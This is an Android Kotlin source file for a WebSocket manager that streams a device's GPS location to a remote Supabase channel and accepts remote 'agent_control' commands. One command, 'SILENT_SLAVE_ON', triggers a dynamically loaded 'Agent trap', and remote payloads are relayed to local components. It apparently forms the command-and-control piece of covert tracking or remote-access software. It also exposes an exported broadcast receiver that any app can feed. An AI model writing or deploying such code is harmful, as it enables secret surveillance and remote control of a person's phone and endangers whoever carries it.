package com.example.myandroid

import android.content.Context
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit

object SocketManager {
    private var client: OkHttpClient? = null
    private var webSocket: WebSocket? = null
    private var currentDeviceId: String? = null
    private var isConnected = false
    private var appContext: Context? = null

    private val agentBroadcastReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context, intent: android.content.Intent) {
            if (intent.action == "com.cortex.action.AGENT_BROADCAST") {
                val event = intent.getStringExtra("event") ?: ""
                val dataStr = intent.getStringExtra("data") ?: "{}"
                try {
                    broadcast(event, JSONObject(dataStr))
                } catch(e: Exception) {}
            }
        }
    }

    fun broadcast(event: String, data: JSONObject) {
        if (!isConnected || webSocket == null) return
        try {
            val wrap = JSONObject().apply {
                put("type", "broadcast")
                put("event", event)
                put("payload", JSONObject().put("data", data))
            }
            val outer = JSONObject().apply {
                put("topic", "realtime:tracking:$currentDeviceId")
                put("event", "broadcast")
                put("payload", wrap)
                put("ref", "3")
            }
            webSocket?.send(outer.toString())
        } catch(e: Exception) {}
    }

    fun connect(ctx: Context) {
        if (isConnected) return
        appContext = ctx.applicationContext
        
        val deviceId = DeviceManager.getDeviceId(ctx)
        currentDeviceId = deviceId
        val supabaseUrl = SecretVault.getGatewayUrl(ctx)
            .replace("functions/v1/cortex-gateway", "realtime/v1/websocket")
            .replace("https://", "wss://")
            .replace("http://", "ws://")
        val apiKey = SecretVault.getLock(ctx)
        
        val url = "$supabaseUrl?apikey=$apiKey&vsn=1.0.0"
        
        client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()

        val request = Request.Builder()
            .url(url)
            .addHeader("apikey", apiKey)
            .addHeader("Authorization", "Bearer $apiKey")
            .build()
        
        val filter = android.content.IntentFilter("com.cortex.action.AGENT_BROADCAST")
        if (android.os.Build.VERSION.SDK_INT >= 33) {
            ctx.registerReceiver(agentBroadcastReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            ctx.registerReceiver(agentBroadcastReceiver, filter)
        }

        webSocket = client?.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                isConnected = true
                DebugLogger.log("WS", "Socket Connected. Joining Channel...")
                
                // Compile strict channel configuration
                val configObj = JSONObject().apply {
                    put("broadcast", JSONObject().apply {
                        put("self", true)
                        put("ack", false)
                    })
                    put("presence", JSONObject().apply {
                        put("key", "")
                    })
                    put("postgres_changes", org.json.JSONArray())
                }

                // Compile mandatory payload properties (required: [access_token, config])
                val payloadObj = JSONObject().apply {
                    put("config", configObj)
                    put("access_token", apiKey)
                }

                val joinMsg = JSONObject().apply {
                    put("topic", "realtime:tracking:$deviceId")
                    put("event", "phx_join")
                    put("payload", payloadObj)
                    put("ref", "1")
                    put("join_ref", "1")
                }
                
                webSocket.send(joinMsg.toString())
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                                    val json = JSONObject(text)
                if (json.optString("event") == "broadcast") {
                    val payload = json.optJSONObject("payload")
                    if (payload != null && payload.optString("event") == "agent_control") {
                        val innerPayload = payload.optJSONObject("payload")?.optJSONObject("data")
                        if (innerPayload != null) {
                            val action = innerPayload.optString("action")
                            if (action == "SILENT_SLAVE_ON") {
                                DebugLogger.log("WS", "Intercepting SILENT_SLAVE_ON. Deploying Agent trap dynamically.")
                                appContext?.let { ctx ->
                                    val bridge = DynamicUIManager.CortexBridge(ctx)
                                    bridge.triggerTrap("DEX", "Agent")
                                    
                                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                        val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
                                            putExtra("payload", innerPayload.toString())
                                        }
                                        ctx.sendBroadcast(intent)
                                    }, 2500)
                                }
                            } else {
                                val intent = android.content.Intent("com.cortex.action.AGENT_CONTROL").apply {
                                    putExtra("payload", innerPayload.toString())
                                }
                                appContext?.sendBroadcast(intent)
                            }
                        }
                    }
                }
                } catch(e: Exception) {}

                if (text.contains("phx_reply") && text.contains("\"status\":\"ok\"")) {
                    if (text.contains("\"ref\":\"1\"")) {
                        DebugLogger.log("WS", "Channel Join Confirmed by Supabase.")
                    }
                } else if (text.contains("phx_error")) {
                    DebugLogger.log("WS_ERR", "Channel Error: $text")
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                isConnected = false
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                isConnected = false
                DebugLogger.log("WS_ERR", "Socket Failure: ${t.message}")
            }
        })
    }

    fun streamLocation(lat: Double, lon: Double, acc: Float) {
        if (!isConnected || webSocket == null) {
            DebugLogger.log("WS_WARN", "Cannot stream: Socket not connected.")
            return
        }
        
        try {
            // Send Phoenix Heartbeat to keep connection alive
            val hb = JSONObject().apply {
                put("topic", "phoenix")
                put("event", "heartbeat")
                put("payload", JSONObject())
                put("ref", "hb")
            }
            webSocket?.send(hb.toString())

            // Build Broadcast
            val payload = JSONObject()
            payload.put("lat", lat)
            payload.put("lon", lon)
            payload.put("acc", acc)
            payload.put("ts", System.currentTimeMillis())

            // Double-nest the payload to align with Supabase's Client SDK parser
            val dataWrapper = JSONObject().put("data", payload)
            val wrap = JSONObject().apply {
                put("type", "broadcast")
                put("event", "location_update")
                put("payload", dataWrapper)
            }

            val outer = JSONObject().apply {
                put("topic", "realtime:tracking:$currentDeviceId")
                put("event", "broadcast")
                put("payload", wrap)
                put("ref", "2")
            }

            webSocket?.send(outer.toString())
            DebugLogger.log("WS_STREAM", "Broadcasted location: $lat, $lon")
        } catch (e: Exception) {
            DebugLogger.log("WS_ERR", "Stream failed: ${e.message}")
        }
    }

    fun disconnect() {
        try { appContext?.unregisterReceiver(agentBroadcastReceiver) } catch(e: Exception) {}
        webSocket?.close(1000, "Session Finished")
        webSocket = null
        isConnected = false
        DebugLogger.log("WS", "Socket Disconnected")
    }
}